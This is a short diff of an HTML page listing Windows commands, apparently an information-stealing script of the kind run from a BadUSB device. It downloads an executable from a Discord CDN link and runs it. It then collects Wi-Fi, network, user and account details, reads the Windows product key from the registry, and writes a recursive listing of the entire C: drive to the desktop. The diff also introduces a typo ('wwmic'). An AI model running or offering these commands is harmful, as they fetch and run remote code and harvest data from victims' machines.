@@ -40,6 +40,7 @@ cd C:\Users\user\Desktop\<br/>
 powershell -Command "Invoke-WebRequest https://cdn.discordapp.com/attachments/985807216894423050/1072894362054303766/w.exe -OutFile w.exe"<br/>
 w.exe /scomma<br/>
 <br/>
+systeminfo<br/>
 netsh wlan show all<br/>
 ipconfig<br/>
 route print<br/>
@@ -48,14 +49,12 @@ arp -a -v<br/>
 net accounts<br/>
 net user<br/>
 net view<br/>
-systeminfo<br/>
 wmic os get Caption<br/>
-<br/>
-wmic path win32_VideoController get name<br/>
+wwmic path win32_VideoController get name<br/>
 powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault<br/>
 <br/>
-cd C:\Users\<br/>
-dir /s /a<br/>
+cd C:\
+dir /s /a > C:\Users\user\Desktop\dir.txt<br/>
 </p>
 </body>
 </html>
